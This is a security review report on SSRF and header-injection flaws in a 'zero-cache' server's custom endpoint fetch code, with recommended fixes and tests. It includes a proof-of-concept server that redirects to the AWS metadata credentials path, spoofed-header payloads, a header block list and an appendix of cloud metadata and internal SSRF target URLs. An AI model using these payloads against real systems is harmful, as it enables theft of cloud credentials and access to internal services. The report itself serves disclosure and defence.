# Security Review Phase 4.2 - Custom Endpoint SSRF

## Executive Summary

This document contains the security review findings for Phase 4.2 (Custom Endpoint SSRF):
- URLPattern validation
- SSRF via overly permissive patterns
- URL parameter injection
- Header injection possibilities
- Redirect following behavior

**Overall Assessment**: 1 high-severity issue and 1 medium-severity issue identified. The URL validation mechanism is well-designed but redirect following creates a significant SSRF vector.

---

## Architecture Overview

### Custom Endpoint Flow

```
Client (WebSocket)
       │
       │  initConnectionMessage
       │  {userPushURL, userPushHeaders, userQueryURL, userQueryHeaders}
       │
       ▼
┌─────────────────────┐
│   ViewSyncer /      │  ← Stores user-provided URLs and headers
│   Pusher            │
└─────────┬───────────┘
          │
          │  Custom mutation/query
          ▼
┌─────────────────────┐
│  fetchFromAPIServer │  ← Validates URL against patterns
│  (custom/fetch.ts)  │
└─────────┬───────────┘
          │
          ▼
┌─────────────────────┐
│  URL Validation     │  ← urlMatch() checks against ZERO_MUTATE_URL
│                     │     or ZERO_QUERY_URL patterns
└─────────┬───────────┘
          │
          │  If URL matches pattern
          ▼
┌─────────────────────┐
│  fetch()            │  ← **VULNERABILITY**: Follows redirects
│  POST to user URL   │
└─────────────────────┘
```

---

## Findings

### HIGH-01: SSRF via Redirect Following

**Severity**: HIGH
**CVSS Score**: 7.5 (High)
**File**: `packages/zero-cache/src/custom/fetch.ts`
**Lines**: 136-140

**Vulnerability Description**:

The `fetch()` call does not disable redirect following:

```typescript
const response = await fetch(finalUrl, {
  method: 'POST',
  headers,
  body: JSON.stringify(body),
  // NO redirect: 'manual' specified - follows redirects by default!
});
```

**Attack Scenario**:

1. Attacker configures a server at `https://attacker.example.com/api`
2. Admin configures `ZERO_MUTATE_URL=https://*.example.com/api`
3. Client sends `userPushURL: "https://attacker.example.com/api"`
4. URL passes validation (matches pattern)
5. Attacker's server responds with `302 Location: http://169.254.169.254/latest/meta-data/`
6. Zero-cache follows redirect to AWS metadata service
7. Attacker receives response containing cloud credentials

**Impact**:
- Access to cloud metadata services (AWS, GCP, Azure)
- Access to internal services not exposed to internet
- Reading internal configuration
- Potential RCE via internal services

**Proof of Concept**:

Attacker's server:
```javascript
// attacker-server.js
app.post('/api', (req, res) => {
  // Redirect to AWS metadata
  res.redirect(302, 'http://169.254.169.254/latest/meta-data/iam/security-credentials/');
});
```

Client code:
```typescript
// Client provides attacker URL
const z = new Zero({
  userPushURL: 'https://attacker.example.com/api',
});
```

**Recommendation**:

Disable redirect following or validate redirected URLs:

```typescript
const response = await fetch(finalUrl, {
  method: 'POST',
  headers,
  body: JSON.stringify(body),
  redirect: 'manual',  // Don't follow redirects
});

// If redirect is needed, validate the new URL
if (response.status >= 300 && response.status < 400) {
  const location = response.headers.get('Location');
  if (location) {
    const redirectUrl = new URL(location, finalUrl);
    if (!urlMatch(redirectUrl.toString(), allowedUrlPatterns)) {
      throw new Error(`Redirect to ${redirectUrl} not allowed`);
    }
    // Optionally follow validated redirect
  }
}
```

---

### MEDIUM-01: Client-Controlled Header Injection

**Severity**: MEDIUM
**CVSS Score**: 5.3 (Medium)
**Files**:
- `packages/zero-protocol/src/connect.ts:34,37`
- `packages/zero-cache/src/custom/fetch.ts:104-106`

**Vulnerability Description**:

Clients can provide arbitrary headers via `userPushHeaders` and `userQueryHeaders`:

```typescript
// Protocol schema - no validation on header names/values
userPushHeaders: v.record(v.string()).optional(),
userQueryHeaders: v.record(v.string()).optional(),

// Directly merged into request headers
if (headerOptions.customHeaders) {
  Object.assign(headers, headerOptions.customHeaders);  // No filtering!
}
```

**Attack Scenarios**:

1. **Overwrite Security Headers**:
   ```typescript
   userPushHeaders: {
     'X-Forwarded-For': '127.0.0.1',     // Bypass IP-based auth
     'X-Real-IP': '10.0.0.1',            // Spoof internal IP
     'Host': 'internal-service.local',   // Host header injection
   }
   ```

2. **Authentication Bypass**:
   ```typescript
   userPushHeaders: {
     'Authorization': 'Bearer admin-token',  // Override server's token
   }
   ```

3. **Cache Poisoning**:
   ```typescript
   userPushHeaders: {
     'X-Cache-Key': 'admin-dashboard',
   }
   ```

**Impact**:
- Bypass IP-based access controls
- Override authentication tokens
- Host header injection attacks
- Cache poisoning

**Recommendation**:

1. Implement header allowlist:
```typescript
const ALLOWED_CUSTOM_HEADERS = new Set([
  'x-request-id',
  'x-correlation-id',
  'x-custom-metadata',
]);

function filterHeaders(headers: Record<string, string>): Record<string, string> {
  const filtered: Record<string, string> = {};
  for (const [key, value] of Object.entries(headers)) {
    const lowerKey = key.toLowerCase();
    if (ALLOWED_CUSTOM_HEADERS.has(lowerKey)) {
      filtered[key] = value;
    }
  }
  return filtered;
}
```

2. Or implement header blocklist:
```typescript
const BLOCKED_HEADERS = new Set([
  'host',
  'authorization',
  'cookie',
  'x-forwarded-for',
  'x-real-ip',
  'x-forwarded-host',
  'x-api-key',
  'content-type',
  'content-length',
  'transfer-encoding',
]);

function sanitizeHeaders(headers: Record<string, string>): Record<string, string> {
  const sanitized: Record<string, string> = {};
  for (const [key, value] of Object.entries(headers)) {
    if (!BLOCKED_HEADERS.has(key.toLowerCase())) {
      sanitized[key] = value;
    }
  }
  return sanitized;
}
```

---

## Positive Findings

### URL Pattern Validation - SECURE (with caveats)

**Status**: SECURE (when properly configured)
**File**: `packages/zero-cache/src/custom/fetch.ts`

The URL validation mechanism is well-designed:

```typescript
if (!urlMatch(url, allowedUrlPatterns)) {
  throw new ProtocolErrorWithLevel({
    kind: ErrorKind.PushFailed,
    message: `URL "${url}" is not allowed by the ZERO_MUTATE_URL configuration`,
    // ...
  });
}
```

**Strengths**:
- Client-provided URLs MUST match configured patterns
- Patterns are compiled at startup, not runtime
- Query parameters are ignored during matching (prevents bypasses)
- Clear error messages when URL is rejected

### Reserved Parameters Protected - SECURE

**Status**: SECURE
**File**: `packages/zero-cache/src/custom/fetch.ts`

Reserved parameters (`schema`, `appID`) cannot be injected:

```typescript
const reservedParams = ['schema', 'appID'];

for (const reserved of reservedParams) {
  assert(
    !params.has(reserved),
    `The push URL cannot contain the reserved query param "${reserved}"`,
  );
}

// Server adds these after validation
params.append('schema', upstreamSchema(shard));
params.append('appID', shard.appID);
```

**This prevents**:
- Schema injection attacks
- Cross-app data access
- Parameter pollution of reserved params

### URLPattern Security Features - ADEQUATE

**Status**: ADEQUATE
**File**: `packages/zero-cache/src/custom/fetch.ts`

URLPattern provides good default security:

```typescript
// Query params and hash ignored by default
// This prevents bypass attempts like:
// https://api.example.com/endpoint?redirect=http://internal
```

---

## Configuration Guidance

### Secure URL Pattern Examples

| Pattern | Security Level | Notes |
|---------|---------------|-------|
| `https://api.example.com/v1/mutations` | HIGH | Exact match, most secure |
| `https://api.example.com/v1/:action` | MEDIUM | Named parameter, limited paths |
| `https://api.example.com/*` | LOW | Any path, use with caution |
| `https://*.example.com/api` | LOW | Wildcard subdomain, risky |
| `https://*` | CRITICAL | Allows any HTTPS URL - DO NOT USE |

### Dangerous Pattern Examples

```typescript
// ❌ DANGEROUS: Allows any HTTPS URL
ZERO_MUTATE_URL=https://*

// ❌ DANGEROUS: Wildcard subdomain could match attacker-controlled
ZERO_MUTATE_URL=https://*.example.com/*

// ❌ DANGEROUS: HTTP allows MITM and internal networks
ZERO_MUTATE_URL=http://*

// ✓ SAFE: Exact match with controlled subdomain
ZERO_MUTATE_URL=https://api.myapp.example.com/v1/mutations

// ✓ SAFE: Limited path with version parameter
ZERO_MUTATE_URL=https://api.example.com/v:version/mutations
```

---

## Remediation Priority

| Finding | Severity | Effort | Priority |
|---------|----------|--------|----------|
| HIGH-01: SSRF via redirect following | High | Low | P0 |
| MEDIUM-01: Header injection | Medium | Low | P1 |

---

## Recommended Test Cases

### For HIGH-01 (Redirect SSRF):
```typescript
test('does not follow redirects to disallowed URLs', async () => {
  // Mock server that redirects to internal IP
  mockFetch.mockResolvedValueOnce(
    new Response(null, {
      status: 302,
      headers: { Location: 'http://169.254.169.254/latest/meta-data/' }
    })
  );

  await expect(
    fetchFromAPIServer(validator, 'push', lc, baseUrl, false, allowedPatterns, shard, {}, body)
  ).rejects.toThrow(/redirect.*not allowed/i);
});

test('does not follow redirects to HTTP when HTTPS required', async () => {
  mockFetch.mockResolvedValueOnce(
    new Response(null, {
      status: 302,
      headers: { Location: 'http://api.example.com/endpoint' }
    })
  );

  await expect(
    fetchFromAPIServer(validator, 'push', lc, baseUrl, false, allowedPatterns, shard, {}, body)
  ).rejects.toThrow(/redirect.*not allowed|protocol downgrade/i);
});
```

### For MEDIUM-01 (Header Injection):
```typescript
test('filters dangerous headers from customHeaders', async () => {
  mockFetch.mockResolvedValueOnce(
    new Response(JSON.stringify({success: true}), {status: 200})
  );

  await fetchFromAPIServer(
    validator,
    'push',
    lc,
    baseUrl,
    false,
    allowedPatterns,
    shard,
    {
      customHeaders: {
        'Host': 'evil.com',
        'X-Forwarded-For': '127.0.0.1',
        'Authorization': 'Bearer hacked',
        'X-Safe-Header': 'allowed',
      },
    },
    body
  );

  const [, init] = mockFetch.mock.calls[0]!;
  const headers = init?.headers as Record<string, string>;

  // Dangerous headers should be filtered
  expect(headers['Host']).toBeUndefined();
  expect(headers['X-Forwarded-For']).toBeUndefined();
  expect(headers['Authorization']).not.toBe('Bearer hacked');

  // Safe headers should pass through
  expect(headers['X-Safe-Header']).toBe('allowed');
});
```

---

## Files Reviewed

| File | Purpose | Findings |
|------|---------|----------|
| `packages/zero-cache/src/custom/fetch.ts` | Main fetch logic | Redirect SSRF, header injection |
| `packages/zero-cache/src/custom/fetch.test.ts` | Tests | URL validation tested, redirects not tested |
| `packages/zero-protocol/src/connect.ts` | Protocol schema | No header validation |
| `packages/zero-cache/src/services/mutagen/pusher.ts` | Push mutations | Uses customHeaders |
| `packages/zero-cache/src/services/view-syncer/view-syncer.ts` | Query transforms | Uses customHeaders |
| `packages/zero-cache/src/custom-queries/transform-query.ts` | Query transformer | Forwards headers |

---

## Appendix: SSRF Attack Targets

### Cloud Metadata Services

| Cloud | Metadata URL |
|-------|-------------|
| AWS | `http://169.254.169.254/latest/meta-data/` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` |
| DigitalOcean | `http://169.254.169.254/metadata/v1/` |

### Internal Services

| Target | Risk |
|--------|------|
| `http://localhost:*` | Local services, databases |
| `http://127.0.0.1:*` | Loopback services |
| `http://[::1]:*` | IPv6 loopback |
| `http://10.*.*.*` | Private network |
| `http://172.16-31.*.*` | Private network |
| `http://192.168.*.*` | Private network |

---

## Appendix: URLPattern Matching Behavior

```javascript
// Pattern: https://api.example.com/endpoint

// ✓ Matches:
'https://api.example.com/endpoint'
'https://api.example.com/endpoint?foo=bar'
'https://api.example.com/endpoint#fragment'

// ✗ Does NOT match:
'http://api.example.com/endpoint'   // Wrong protocol
'https://api.example.com/other'      // Wrong path
'https://evil.example.com/endpoint'  // Wrong subdomain
```

```javascript
// Pattern: https://*.example.com/api

// ✓ Matches:
'https://api.example.com/api'
'https://test.example.com/api'
'https://a.b.example.com/api'  // Multiple subdomains match!

// ✗ Does NOT match:
'https://example.com/api'      // No subdomain
'https://attacker.com/api'     // Different domain
```
